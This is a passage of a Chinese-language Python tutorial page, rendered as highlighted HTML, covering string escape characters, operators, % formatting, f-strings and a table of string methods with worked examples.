class="token comment"># print('\a')  # 响铃</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test \btest'</span><span class="token punctuation">)</span>  <span class="token comment"># 退格</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\000'</span><span class="token punctuation">)</span>  <span class="token comment"># 空</span><span class="token comment"># </span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'1\n1'</span><span class="token punctuation">)</span>  <span class="token comment"># 换行</span><span class="token comment"># 1</span><span class="token comment"># 1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\vtest'</span><span class="token punctuation">)</span>  <span class="token comment"># 纵向制表符</span><span class="token comment">#testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\ttest'</span><span class="token punctuation">)</span>  <span class="token comment"># 横向制表符</span><span class="token comment"># testtest</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test eee\r11  33'</span><span class="token punctuation">)</span>  <span class="token comment"># \r后面替换前面</span><span class="token comment"># 11  33</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test\ftest'</span><span class="token punctuation">)</span>  <span class="token comment"># 换页</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\666'</span><span class="token punctuation">)</span>  <span class="token comment"># 8进制</span><span class="token comment"># z</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x33'</span><span class="token punctuation">)</span>  <span class="token comment"># 16进制</span><span class="token comment"># 3</span><span class="token triple-quoted-string string">'''testtest\'"testtest 11testtesttesttest11  33testtestƶ3'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="运算符-1"><a href="#运算符-1" class="headerlink" title="运算符"></a>运算符</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 运算符</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'2'</span> <span class="token operator">+</span> <span class="token string">'rr'</span><span class="token punctuation">)</span>  <span class="token comment"># 连接符</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'test'</span> <span class="token operator">*</span> <span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 重复符</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 索引符</span><span class="token comment"># in not in 成员运算符</span>a <span class="token operator">=</span> <span class="token string">'hahah'</span><span class="token keyword">if</span> <span class="token string">'a'</span> <span class="token keyword">in</span> a<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'in'</span><span class="token punctuation">)</span><span class="token keyword">else</span> <span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"not in"</span><span class="token punctuation">)</span><span class="token comment"># %格式控制符</span>    <span class="token triple-quoted-string string">'''2rrtesttestein'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="字符格式化"><a href="#字符格式化" class="headerlink" title="字符格式化"></a>字符格式化</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">"我叫 %s 今年 %d 岁!"</span> <span class="token operator">%</span> <span class="token punctuation">(</span><span class="token string">'小明'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#我叫 小明 今年 10 岁!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">符  号</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">%c</td><td align="left">格式化字符及其ASCII码</td></tr><tr><td align="left">%s</td><td align="left">格式化字符串</td></tr><tr><td align="left">%d</td><td align="left">格式化整数</td></tr><tr><td align="left">%u</td><td align="left">格式化无符号整型</td></tr><tr><td align="left">%o</td><td align="left">格式化无符号八进制数</td></tr><tr><td align="left">%x</td><td align="left">格式化无符号十六进制数</td></tr><tr><td align="left">%X</td><td align="left">格式化无符号十六进制数（大写）</td></tr><tr><td align="left">%f</td><td align="left">格式化浮点数字，可指定小数点后的精度</td></tr><tr><td align="left">%e</td><td align="left">用科学计数法格式化浮点数</td></tr><tr><td align="left">%E</td><td align="left">作用同%e，用科学计数法格式化浮点数</td></tr><tr><td align="left">%g</td><td align="left">%f和%e的简写</td></tr><tr><td align="left">%G</td><td align="left">%f 和 %E 的简写</td></tr><tr><td align="left">%p</td><td align="left">用十六进制数格式化变量的地址</td></tr></tbody></table><table><thead><tr><th align="left">符号</th><th align="left">功能</th></tr></thead><tbody><tr><td align="left">*</td><td align="left">定义宽度或者小数点精度</td></tr><tr><td align="left">-</td><td align="left">用做左对齐</td></tr><tr><td align="left">+</td><td align="left">在正数前面显示加号( + )</td></tr><tr><td align="left"><sp></sp></td><td align="left">在正数前面显示空格</td></tr><tr><td align="left">#</td><td align="left">在八进制数前面显示零(‘0’)，在十六进制前面显示’0x’或者’0X’(取决于用的是’x’还是’X’)</td></tr><tr><td align="left">0</td><td align="left">显示的数字前面填充’0’而不是默认的空格</td></tr><tr><td align="left">%</td><td align="left">‘%%’输出一个单一的’%’</td></tr><tr><td align="left">(var)</td><td align="left">映射变量(字典参数)</td></tr><tr><td align="left">m.n.</td><td align="left">m 是显示的最小总宽度,n 是小数点后的位数(如果可用的话)</td></tr></tbody></table><h3 id="三引号"><a href="#三引号" class="headerlink" title="三引号"></a>三引号</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 三引号</span>para_str <span class="token operator">=</span> <span class="token triple-quoted-string string">"""这是一个多行字符串的实例多行字符串可以使用制表符TAB ( \t )。也可以使用换行符 [ \n ]。"""</span><span class="token keyword">print</span> <span class="token punctuation">(</span>para_str<span class="token punctuation">)</span><span class="token comment"># 跨多行</span><span class="token triple-quoted-string string">'''这是一个多行字符串的实例多行字符串可以使用制表符TAB (  )。也可以使用换行符 [  ]。'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="f-string"><a href="#f-string" class="headerlink" title="f-string"></a>f-string</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># f-string</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">'test'</span><span class="token string-interpolation"><span class="token string">f'Hello </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">str</span><span class="token punctuation">}</span></span><span class="token string">'</span></span>  <span class="token comment"># 替换变量</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span>         <span class="token comment"># 使用表达式</span>w <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'str'</span><span class="token punctuation">:</span> <span class="token string">'test'</span><span class="token punctuation">,</span> <span class="token string">'var'</span><span class="token punctuation">:</span> <span class="token string">'var'</span><span class="token punctuation">}</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">{</span>w<span class="token punctuation">[</span><span class="token string">"str"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">: </span><span class="token interpolation"><span class="token punctuation">{</span>w<span class="token punctuation">[</span><span class="token string">"var"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><span class="token triple-quoted-string string">'''3test: var'''</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><table><thead><tr><th align="left">序号</th><th align="left">方法及描述</th></tr></thead><tbody><tr><td align="left">1</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-capitalize.html">capitalize()</a> 将字符串的第一个字符转换为大写</td></tr><tr><td align="left">2</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-center.html">center(width, fillchar)</a> 返回一个指定的宽度 width 居中的字符串，fillchar 为填充的字符，默认为空格。</td></tr><tr><td align="left">3</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-count.html">count(str, beg= 0,end=len(string))</a> 返回 str 在 string 里面出现的次数，如果 beg 或者 end 指定则返回指定范围内 str 出现的次数</td></tr><tr><td align="left">4</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-decode.html">bytes.decode(encoding=”utf-8”, errors=”strict”)</a> Python3 中没有 decode 方法，但我们可以使用 bytes 对象的 decode() 方法来解码给定的 bytes 对象，这个 bytes 对象可以由 str.encode() 来编码返回。</td></tr><tr><td align="left">5</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-encode.html">encode(encoding=’UTF-8’,errors=’strict’)</a> 以 encoding 指定的编码格式编码字符串，如果出错默认报一个ValueError 的异常，除非 errors 指定的是’ignore’或者’replace’</td></tr><tr><td align="left">6</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-endswith.html">endswith(suffix, beg=0, end=len(string))</a> 检查字符串是否以 obj 结束，如果beg 或者 end 指定则检查指定的范围内是否以 obj 结束，如果是，返回 True,否则返回 False.</td></tr><tr><td align="left">7</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-expandtabs.html">expandtabs(tabsize=8)</a> 把字符串 string 中的 tab 符号转为空格，tab 符号默认的空格数是 8 。</td></tr><tr><td align="left">8</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-find.html">find(str, beg=0, end=len(string))</a> 检测 str 是否包含在字符串中，如果指定范围 beg 和 end ，则检查是否包含在指定范围内，如果包含返回开始的索引值，否则返回-1</td></tr><tr><td align="left">9</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-index.html">index(str, beg=0, end=len(string))</a> 跟find()方法一样，只不过如果str不在字符串中会报一个异常。</td></tr><tr><td align="left">10</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalnum.html">isalnum()</a> 如果字符串至少有一个字符并且所有字符都是字母或数字则返 回 True，否则返回 False</td></tr><tr><td align="left">11</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isalpha.html">isalpha()</a> 如果字符串至少有一个字符并且所有字符都是字母或中文字则返回 True, 否则返回 False</td></tr><tr><td align="left">12</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdigit.html">isdigit()</a> 如果字符串只包含数字则返回 True 否则返回 False..</td></tr><tr><td align="left">13</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-islower.html">islower()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是小写，则返回 True，否则返回 False</td></tr><tr><td align="left">14</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isnumeric.html">isnumeric()</a> 如果字符串中只包含数字字符，则返回 True，否则返回 False</td></tr><tr><td align="left">15</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isspace.html">isspace()</a> 如果字符串中只包含空白，则返回 True，否则返回 False.</td></tr><tr><td align="left">16</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-istitle.html">istitle()</a> 如果字符串是标题化的(见 title())则返回 True，否则返回 False</td></tr><tr><td align="left">17</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isupper.html">isupper()</a> 如果字符串中包含至少一个区分大小写的字符，并且所有这些(区分大小写的)字符都是大写，则返回 True，否则返回 False</td></tr><tr><td align="left">18</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-join.html">join(seq)</a> 以指定字符串作为分隔符，将 seq 中所有的元素(的字符串表示)合并为一个新的字符串</td></tr><tr><td align="left">19</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-len.html">len(string)</a> 返回字符串长度</td></tr><tr><td align="left">20</td><td align="left">[ljust(width<a href="https://www.runoob.com/python3/python3-string-ljust.html">, fillchar])</a> 返回一个原字符串左对齐,并使用 fillchar 填充至长度 width 的新字符串，fillchar 默认为空格。</td></tr><tr><td align="left">21</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lower.html">lower()</a> 转换字符串中所有大写字符为小写.</td></tr><tr><td align="left">22</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-lstrip.html">lstrip()</a> 截掉字符串左边的空格或指定字符。</td></tr><tr><td align="left">23</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-maketrans.html">maketrans()</a> 创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。</td></tr><tr><td align="left">24</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-max.html">max(str)</a> 返回字符串 str 中最大的字母。</td></tr><tr><td align="left">25</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-min.html">min(str)</a> 返回字符串 str 中最小的字母。</td></tr><tr><td align="left">26</td><td align="left">[replace(old, new <a href="https://www.runoob.com/python3/python3-string-replace.html">, max])</a> 把 将字符串中的 old 替换成 new,如果 max 指定，则替换不超过 max 次。</td></tr><tr><td align="left">27</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rfind.html">rfind(str, beg=0,end=len(string))</a> 类似于 find()函数，不过是从右边开始查找.</td></tr><tr><td align="left">28</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rindex.html">rindex( str, beg=0, end=len(string))</a> 类似于 index()，不过是从右边开始.</td></tr><tr><td align="left">29</td><td align="left">[rjust(width,<a href="https://www.runoob.com/python3/python3-string-rjust.html">, fillchar])</a> 返回一个原字符串右对齐,并使用fillchar(默认空格）填充至长度 width 的新字符串</td></tr><tr><td align="left">30</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-rstrip.html">rstrip()</a> 删除字符串末尾的空格或指定字符。</td></tr><tr><td align="left">31</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-split.html">split(str=””, num=string.count(str))</a> 以 str 为分隔符截取字符串，如果 num 有指定值，则仅截取 num+1 个子字符串</td></tr><tr><td align="left">32</td><td align="left">[splitlines(<a href="https://www.runoob.com/python3/python3-string-splitlines.html">keepends])</a> 按照行(‘\r’, ‘\r\n’, \n’)分隔，返回一个包含各行作为元素的列表，如果参数 keepends 为 False，不包含换行符，如果为 True，则保留换行符。</td></tr><tr><td align="left">33</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-startswith.html">startswith(substr, beg=0,end=len(string))</a> 检查字符串是否是以指定子字符串 substr 开头，是则返回 True，否则返回 False。如果beg 和 end 指定值，则在指定范围内检查。</td></tr><tr><td align="left">34</td><td align="left">[strip(<a href="https://www.runoob.com/python3/python3-string-strip.html">chars])</a> 在字符串上执行 lstrip()和 rstrip()</td></tr><tr><td align="left">35</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-swapcase.html">swapcase()</a> 将字符串中大写转换为小写，小写转换为大写</td></tr><tr><td align="left">36</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-title.html">title()</a> 返回”标题化”的字符串,就是说所有单词都是以大写开始，其余字母均为小写(见 istitle())</td></tr><tr><td align="left">37</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-translate.html">translate(table, deletechars=””)</a> 根据 str 给出的表(包含 256 个字符)转换 string 的字符, 要过滤掉的字符放到 deletechars 参数中</td></tr><tr><td align="left">38</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-upper.html">upper()</a> 转换字符串中的小写字母为大写</td></tr><tr><td align="left">39</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-zfill.html">zfill (width)</a> 返回长度为 width 的字符串，原字符串右对齐，前面填充0</td></tr><tr><td align="left">40</td><td align="left"><a href="https://www.runoob.com/python3/python3-string-isdecimal.html">isdecimal()</a> 检查字符串是否只包含十进制字符，如果是返回 true，否则返回 false。</td></tr></tbody></table><h3 id="函数示例-1"><a href="#函数示例-1" class="headerlink" title="函数示例"></a>函数示例</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"this is string example from runoob....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.capitalize() : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.capitalize() :  This is string example from runoob....wow!!!</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"[runoob]"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.center(40, '*') : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>center<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.center(40, '*') :  ****************[runoob]****************</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.runoob.com"</span>sub <span class="token operator">=</span> <span class="token string">'o'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.count('o') : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>sub<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.count('o') :  3</span>sub <span class="token operator">=</span> <span class="token string">'run'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str.count('run', 0, 10) : "</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>count<span class="token punctuation">(</span>sub<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># str.count('run', 0, 10) :  1</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"菜鸟教程"</span>str_utf8 <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span>str_gbk <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"GBK"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 菜鸟教程</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"UTF-8 编码："</span><span class="token punctuation">,</span> str_utf8<span class="token punctuation">)</span><span class="token comment"># UTF-8 编码： b'\xe8\x8f\x9c\xe9\xb8\x9f\xe6\x95\x99\xe7\xa8\x8b'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"GBK 编码："</span><span class="token punctuation">,</span> str_gbk<span class="token punctuation">)</span><span class="token comment"># GBK 编码： b'\xb2\xcb\xc4\xf1\xbd\xcc\xb3\xcc'</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"UTF-8 解码："</span><span class="token punctuation">,</span> str_utf8<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'UTF-8'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># UTF-8 解码： 菜鸟教程</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"GBK 解码："</span><span class="token punctuation">,</span> str_gbk<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'GBK'</span><span class="token punctuation">,</span> <span class="token string">'strict'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># GBK 解码： 菜鸟教程</span>Str <span class="token operator">=</span> <span class="token string">'Runoob example....wow!!!'</span>suffix <span class="token operator">=</span> <span class="token string">'!!'</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span>suffix <span class="token operator">=</span> <span class="token string">'run'</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token keyword">print</span><span class="token punctuation">(</span>Str<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>suffix<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob\t12345\tabc"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'原始字符串:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token comment"># 原始字符串: runoob12345abc</span><span class="token comment"># 默认 8 个空格</span><span class="token comment"># runnob 有 6 个字符，后面的 \t 填充 2 个空格</span><span class="token comment"># 12345 有 5 个字符，后面的 \t 填充 3 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'替换 \\t 符号:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 替换 \t 符号: runoob  12345   abc</span><span class="token comment"># 2 个空格</span><span class="token comment"># runnob 有 6 个字符，刚好是 2 的 3 倍，后面的 \t 填充 2 个空格</span><span class="token comment"># 12345 有 5 个字符，不是 2 的倍数，后面的 \t 填充 1 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用 2 个空格替换 \\t 符号:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 使用 2 个空格替换 \t 符号: runoob  12345 abc</span><span class="token comment"># 3 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用 3 个空格:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 使用 3 个空格: runoob   12345 abc</span><span class="token comment"># 4 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用 4 个空格:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 使用 4 个空格: runoob  12345   abc</span><span class="token comment"># 5 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用 5 个空格:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 使用 5 个空格: runoob    12345     abc</span><span class="token comment"># 6 个空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'使用 6 个空格:'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">.</span>expandtabs<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 使用 6 个空格: runoob      12345 abc</span>str1 <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"exam"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>find<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># -1</span>str1 <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span>str2 <span class="token operator">=</span> <span class="token string">"exam"</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token keyword">print</span><span class="token punctuation">(</span>str1<span class="token punctuation">.</span>index<span class="token punctuation">(</span>str2<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 7</span><span class="token comment"># print(str1.index(str2, 10))  # 异常</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span>  <span class="token comment"># 字符串没有空格</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"www.runoob.com"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalnum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token comment"># 字母和中文文字</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob菜鸟教程"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Ture</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isalpha<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"123456"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"RUNOOB example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>islower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"runoob2016"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"23443434"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isnumeric<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"       "</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># True</span><span class="token builtin">str</span> <span class="token operator">=</span> <span class="token string">"Runoob example....wow!!!"</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>isspace<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># False</span><span class="token builtin">str</span> <span class="token 